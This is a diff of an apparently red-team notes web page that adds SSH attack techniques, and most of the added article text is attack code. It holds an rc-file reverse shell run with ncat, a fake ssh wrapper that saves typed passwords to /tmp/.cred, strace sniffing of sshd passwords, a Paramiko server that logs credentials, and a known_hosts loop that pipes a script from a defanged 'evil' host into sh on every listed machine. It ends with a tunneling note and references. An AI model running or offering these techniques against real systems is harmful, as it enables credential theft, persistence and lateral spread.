+</code></pre>
+<h4 class="relative group">RC file 
+    <div id="rc-file" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#rc-file" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p align="center">
+    <img src="img/RCFile.png"/>
+</p>
+<ul>
+<li><strong>Global:</strong> <code>/etc/ssh/sshrc</code></li>
+<li><strong>User:</strong> <code>~/.ssh/rc</code></li>
+<li>Run command on login</li>
+</ul>
+<pre tabindex="0"><code class="language-config" data-lang="config">ncat -e /bin/bash &lt;LISTENER IP&gt; 4141 &amp;
+</code></pre>
+<h3 class="relative group">Stealing Credentialss 
+    <div id="stealing-credentialss" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#stealing-credentialss" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+
+<h4 class="relative group">SSH Client (CONT) 
+    <div id="ssh-client-cont" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#ssh-client-cont" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p><code>/usr/local/bin/ssh</code></p>
+<pre tabindex="0"><code>#!/bin/bash
+read -esp &#34;${1}&#39;s password: &#34; password
+echo &#34;$1 - $password&#34; &gt;&gt; /tmp/.cred
+echo
+/usr/bin/ssh $@
+</code></pre>
+<h4 class="relative group">SSHD Server 
+    <div id="sshd-server" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#sshd-server" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<pre tabindex="0"><code># find the sshd process
+root@remote:~$ ps --ppid 1 | grep sshd
+  641 ?      00:00:00 sshd
+
+# strace sshd process and look for password
+root@remote:~$ strace -f -p 641 -e read |&amp; grep -F &#34;\f\0\0\0&#34;
+...
+[pid  2235] read(6, &#34;\f\0\0\0\10sup3s3cr3t&#34;, 16) = 16
+</code></pre>
+<h4 class="relative group">Paramiko Server 
+    <div id="paramiko-server" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#paramiko-server" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">paramiko</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Server</span><span class="p">(</span><span class="n">paramiko</span><span class="o">.</span><span class="n">ServerInterface</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">check_auth_password</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] username: </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2"> password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">AUTH_FAILED</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Create raw socket</span>
+</span></span><span class="line"><span class="cl"><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sock</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">22</span><span class="p">))</span>          <span class="c1"># Listen on port 22 (SSH)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sock</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">client</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Got a connection! </span><span class="si">{</span><span class="n">addr</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Start Paramiko transport on the socket</span>
+</span></span><span class="line"><span class="cl"><span class="n">t</span> <span class="o">=</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">Transport</span><span class="p">(</span><span class="n">client</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">t</span><span class="o">.</span><span class="n">add_server_key</span><span class="p">(</span><span class="n">paramiko</span><span class="o">.</span><span class="n">RSAKey</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="s2">&#34;test_rsa.key&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">server</span> <span class="o">=</span> <span class="n">Server</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">t</span><span class="o">.</span><span class="n">start_server</span><span class="p">(</span><span class="n">server</span><span class="o">=</span><span class="n">server</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">chan</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+</span></span></code></pre></div>
+<h4 class="relative group">Known Hosts 
+    <div id="known-hosts" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#known-hosts" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<pre tabindex="0"><code class="language-script" data-lang="script">if [ -f ~.ssh//known_hosts ] &amp;&amp; [ -f ~/.ssh/id_rsa.pub ]; then
+          for h in $(grep -oE &#34;\b([0-9]{1,3}\.){3}[0-9]{1,3}\b&#34; ~/.ssh/known_hosts); 
+do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h &#39;hxxp://evil[.]co/evilScript | sh&#39; &amp; done
+fi
+</code></pre>
+<h3 class="relative group">Tunneling 
+    <div id="tunneling" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#tunneling" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p align="center">
+    <img src="img/giphy.gif"/>
+</p>
+<p><a
+  href="https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/"
+    target="_blank"
+  >Bypassing Network Restrictions Through RDP Tunneling</a>
+</p>
+<p>Attackers often abuse tunneling techniques to bypass network restrictions and monitoring controls.</p>
+<p>SSH can also be weaponized as a stealthy tunneling tool —  allowing adversaries to evade firewalls, hide malicious traffic, and move laterally across systems under the cover of encrypted sessions.</p>
+
+<h2 class="relative group">References 
+    <div id="references" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#references" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p><a
+  href="https://en.wikipedia.org/wiki/Secure_Shell#Historical_development"
+    target="_blank"
+  >Secure Shell</a>
+</p>
+<p><a
+  href="https://www.ired.team/offensive-security/lateral-movement/ssh-tunnelling-port-forwarding#ssh-dynamic-port-forwarding"
+    target="_blank"
+  >SSH: Dynamic Port Forwarding</a>
+</p>
+<p><a
+  href="https://www.youtube.com/watch?v=XTaKWdIdg8g"
+    target="_blank"
+  >Grey Hat SSH SShenanigans</a>
+</p>
+<p><a
+  href="https://redcanary.com/blog/threat-detection/lateral-movement-with-secure-shell/"
+    target="_blank"
+  >Lateral Movement with Secure Shell (SSH)</a>
+</p>
+<p><a
+  href="https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/"
+    target="_blank"
+  >Bypassing Network Restrictions Through RDP Tunneling</a>
+</p>
+
           
           
           
@@ -1326,6 +2035,360 @@
   
     <h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
     <section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
+      
+        
+
+  <a href="/redteam/initialaccess/phishing/office365/marco/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/redteam/initialaccess/phishing/office365/marco/featured_hu_d66c6522ae9ee4bf.jpg);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/redteam/initialaccess/phishing/office365/marco/">Marco</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-08-20T00:00:00&#43;00:00">20 August 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+        
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/redteam/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Redteam
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/phishing/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Phishing
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/office365/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Office365
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/c2/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    C2
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+        </div>
+
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+      
+        
+
+  <a href="/redteam/initialaccess/phishing/vscode/remotessh/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/redteam/initialaccess/phishing/vscode/remotessh/featured_hu_ccf890815d7389ae.gif);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/redteam/initialaccess/phishing/vscode/remotessh/">Remote SSH</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-08-24T00:00:00&#43;00:00">24 August 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+        
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/redteam/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Redteam
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/ssh/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Ssh
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/phishing/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Phishing
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/vscode/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Vscode
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/remote-access/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Remote-Access
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+        </div>
+
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
       
         
 
@@ -1519,153 +2582,6 @@
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
     WinRM
-  </span>
-</span>
-
-              </span>
-            
-          
-        
-      
-    </div>
-  
-
-  
-  
-
-
-
-        </div>
-
-        
-      </div>
-      <div class="px-6 pt-4 pb-2">
-
-      </div>
-    </div>
-  </a>
-
-      
-        
-
-  <a href="/htb/machines/artificial/" class="min-w-full">
-    
-    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
-        
-        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/htb/machines/artificial/featured_hu_88e4aca8bd6c39d1.png);"></div>
-        
-      
-
-      <div class="px-6 py-4">
-
-        
-        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/htb/machines/artificial/">Artificial</div>
-        
-
-        <div class="text-sm text-neutral-500 dark:text-neutral-400">
-          
-
-
-
-
-
-
-
-  
-
-  
-  
-  
-
-  
-  
-    
-  
-
-  
-    
-  
-
-  
-
-  
-
-  
-    
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  <div class="flex flex-row flex-wrap items-center">
-    
-    
-      <time datetime="2025-07-07T00:00:00&#43;00:00">7 July 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
-    
-
-    
-    
-  </div>
-
-  
-    <div class="flex flex-row flex-wrap items-center">
-      
-        
-          
-        
-      
-        
-      
-        
-      
-        
-      
-    </div>
-  
-
-  
-  
-    <div class="flex flex-row flex-wrap items-center">
-      
-        
-      
-        
-          
-        
-      
-        
-      
-        
-          
-            
-              <span
-                class="mr-2 margin-top-[0.5rem]"
-                onclick="window.open(&#34;/tags/htb/&#34;,'_self');return false;">
-                <span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    HTB
-  </span>
-</span>
-
-              </span>
-            
-              <span
-                class="mr-2 margin-top-[0.5rem]"
-                onclick="window.open(&#34;/tags/machines/&#34;,'_self');return false;">
-                <span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Machines
   </span>
 </span>
 
@@ -1890,175 +2806,6 @@
       
         
 
-  <a href="/notes/race-condition/" class="min-w-full">
-    
-    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
-        
-        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/notes/race-condition/featured_hu_527c73c32cf11f12.jpg);"></div>
-        
-      
-
-      <div class="px-6 py-4">
-
-        
-        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/notes/race-condition/">Race Condition</div>
-        
-
-        <div class="text-sm text-neutral-500 dark:text-neutral-400">
-          
-
-
-
-
-
-
-
-  
-
-  
-  
-  
-
-  
-  
-    
-  
-
-  
-
-  
-
-  
-
-  
-    
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  <div class="flex flex-row flex-wrap items-center">
-    
-    
-      <span title="Reading time">13 mins</span>
-    
-
-    
-    
-  </div>
-
-  
-    <div class="flex flex-row flex-wrap items-center">
-      
-        
-          
-        
-      
-        
-      
-        
-      
-        
-      
-    </div>
-  
-
-  
-  
-    <div class="flex flex-row flex-wrap items-center">
-      
-        
-      
-        
-          
-        
-      
-        
-      
-        
-          
-            
-              <span
-                class="mr-2 margin-top-[0.5rem]"
-                onclick="window.open(&#34;/tags/ctf/&#34;,'_self');return false;">
-                <span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    CTF
-  </span>
-</span>
-
-              </span>
-            
-              <span
-                class="mr-2 margin-top-[0.5rem]"
-                onclick="window.open(&#34;/tags/exploitation/&#34;,'_self');return false;">
-                <span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Exploitation
-  </span>
-</span>
-
-              </span>
-            
-              <span
-                class="mr-2 margin-top-[0.5rem]"
-                onclick="window.open(&#34;/tags/operating-systems/&#34;,'_self');return false;">
-                <span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Operating Systems
-  </span>
-</span>
-
-              </span>
-            
-              <span
-                class="mr-2 margin-top-[0.5rem]"
-                onclick="window.open(&#34;/tags/vulnerability-analysis/&#34;,'_self');return false;">
-                <span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Vulnerability Analysis
-  </span>
-</span>
-
-              </span>
-            
-          
-        
-      
-    </div>
-  
-
-  
-  
-
-
-
-        </div>
-
-        
-      </div>
-      <div class="px-6 pt-4 pb-2">
-
-      </div>
-    </div>
-  </a>
-
-      
-        
-
   <a href="/ctf/pwnable.tw/" class="min-w-full">
     
     <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
@@ -2228,6 +2975,322 @@
   </a>
 
       
+        
+
+  <a href="/htb/machines/artificial/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/htb/machines/artificial/featured_hu_88e4aca8bd6c39d1.png);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/htb/machines/artificial/">Artificial</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-07-07T00:00:00&#43;00:00">7 July 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+        
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/htb/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    HTB
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/machines/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Machines
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+        </div>
+
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+      
+        
+
+  <a href="/notes/race-condition/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/notes/race-condition/featured_hu_527c73c32cf11f12.jpg);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/notes/race-condition/">Race Condition</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <span title="Reading time">13 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+        
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/ctf/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    CTF
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/exploitation/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Exploitation
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/operating-systems/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Operating Systems
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/vulnerability-analysis/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Vulnerability Analysis
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+        </div>
+
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+      
     </section>
   
 
@@ -2261,7 +3324,16 @@
     </footer>
   </article>
 
-        
+        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a
+    href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
       </main><footer id="site-footer" class="py-10 print:hidden">
   
   
